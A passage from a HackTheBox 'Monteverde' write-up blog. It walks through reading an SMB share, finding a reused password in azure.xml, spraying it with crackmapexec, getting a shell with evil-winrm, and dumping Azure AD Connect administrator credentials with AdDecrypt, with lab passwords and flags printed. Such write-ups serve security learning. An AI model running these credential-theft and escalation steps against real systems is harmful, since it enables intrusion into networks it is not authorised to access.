</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=n>users</span><span class=o>$</span>          <span class=n>READ</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s find is there are valuable files in <code>users$</code> share.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient &#39;\\10.10.10.172\users$&#39; -U &#39;SABatchJobs&#39;
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>Enter WORKGROUP\SABatchJobs&#39;s password:
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; recuse on
</span></span><span class=line><span class=cl>recuse: command not found
</span></span><span class=line><span class=cl>smb: \&gt; recurse on
</span></span><span class=line><span class=cl>smb: \&gt; prompt off
</span></span><span class=line><span class=cl>smb: \&gt; mget *
</span></span><span class=line><span class=cl>getting file \mhope\azure.xml of size 1212 as azure.xml (4,8 KiloBytes/sec) (average 4,8 KiloBytes/sec)
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s read <code>/mhope/azure.xml</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;Objs</span> <span class=na>Version=</span><span class=s>&#34;1.1.0.1&#34;</span> <span class=na>xmlns=</span><span class=s>&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;Obj</span> <span class=na>RefId=</span><span class=s>&#34;0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;TN</span> <span class=na>RefId=</span><span class=s>&#34;0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class=nt>&lt;/T&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;T&gt;</span>System.Object<span class=nt>&lt;/T&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/TN&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class=nt>&lt;/ToString&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;Props&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;DT</span> <span class=na>N=</span><span class=s>&#34;StartDate&#34;</span><span class=nt>&gt;</span>2020-01-03T05:35:00.7562298-08:00<span class=nt>&lt;/DT&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;DT</span> <span class=na>N=</span><span class=s>&#34;EndDate&#34;</span><span class=nt>&gt;</span>2054-01-03T05:35:00.7562298-08:00<span class=nt>&lt;/DT&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;G</span> <span class=na>N=</span><span class=s>&#34;KeyId&#34;</span><span class=nt>&gt;</span>00000000-0000-0000-0000-000000000000<span class=nt>&lt;/G&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;S</span> <span class=na>N=</span><span class=s>&#34;Password&#34;</span><span class=nt>&gt;</span>4n0therD4y@n0th3r$<span class=nt>&lt;/S&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/Props&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/Obj&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/Objs&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>It seems a password is leaked, let&rsquo;s try credential stuffing: maybe we can
re-use one of the accounts.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cme smb 10.10.10.172 -u ../users.txt -p &#39;4n0therD4y@n0th3r$&#39;
</span></span><span class=line><span class=cl>SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
</span></span><span class=line><span class=cl>SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
</span></span><span class=line><span class=cl>SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\mhope:4n0therD4y@n0th3r$
</span></span></code></pre></td></tr></table></div></div><p>Cool <code>mhope</code> is using this password too.</p><p>As winRM port is open, we can authenticate and gain shell access with
<a href=https://github.com/Hackplayers/evil-winrm>evil-winrm</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ evil-winrm -i 10.10.10.172 -u &#39;mhope&#39; -p &#39;4n0therD4y@n0th3r$&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; gc ../Desktop/user.txt
</span></span><span class=line><span class=cl>4961976bd7d8f4eeb2ce3705e2f212f2
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation--mhope-to-administrator>Privilege Escalation : mhope to Administrator<a hidden class=anchor aria-hidden=true href=#privilege-escalation--mhope-to-administrator>#</a></h3><p>Then there is a hidden folder:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; dir -Force
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:\Users\mhope\.Azure
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>d-----         1/3/2020   5:35 AM                ErrorRecords
</span></span><span class=line><span class=cl>-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json
</span></span><span class=line><span class=cl>-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json
</span></span><span class=line><span class=cl>-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json
</span></span><span class=line><span class=cl>-a----         1/3/2020   5:36 AM           7896 TokenCache.dat
</span></span></code></pre></td></tr></table></div></div><p>We have azure powershell already loaded <a href=https://github.com/Azure/azure-powershell>https://github.com/Azure/azure-powershell</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; Get-AzContext
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name                                     Account                                              SubscriptionName                                    Environment                                         TenantId
</span></span><span class=line><span class=cl>----                                     -------                                              ----------------                                    -----------                                         --------
</span></span><span class=line><span class=cl>372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com                                                                 AzureCloud                                          372efea9-7bc4-4b76-8839-984b45edfb98
</span></span></code></pre></td></tr></table></div></div><p>There is great resources and tools about exploiting <em>Azure AD Connect</em>.</p><ul><li><a href=https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/>Azure AD Connect Database Exploit (Priv Esc)</a></li><li><a href=https://github.com/fox-it/adconnectdump>Azure AD Connect password extraction</a></li></ul><p>You can fidn a pre-compiled version of <code>AdSyncDecrypt</code> <a href=https://github.com/VbScrub/AdSyncDecrypt/releases>here</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>C:/Users/mhope/.Azure/AdDecrypt.exe -FullSQL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>======================
</span></span><span class=line><span class=cl>AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
</span></span><span class=line><span class=cl>Based on original code from: https://github.com/fox-it/adconnectdump
</span></span><span class=line><span class=cl>======================
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Opening database connection...
</span></span><span class=line><span class=cl>Executing SQL commands...
</span></span><span class=line><span class=cl>Closing database connection...
</span></span><span class=line><span class=cl>Decrypting XML...
</span></span><span class=line><span class=cl>Parsing XML...
</span></span><span class=line><span class=cl>Finished!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DECRYPTED CREDENTIALS:
</span></span><span class=line><span class=cl>Username: administrator
</span></span><span class=line><span class=cl>Password: d0m@in4dminyeah!
</span></span><span class=line><span class=cl>Domain: MEGABANK.LOCAL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; gc ../Desktop/root.txt
</span></span><span class=line><span class=cl>12909612d25c8dcf6e5a07d1a804a0bc
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>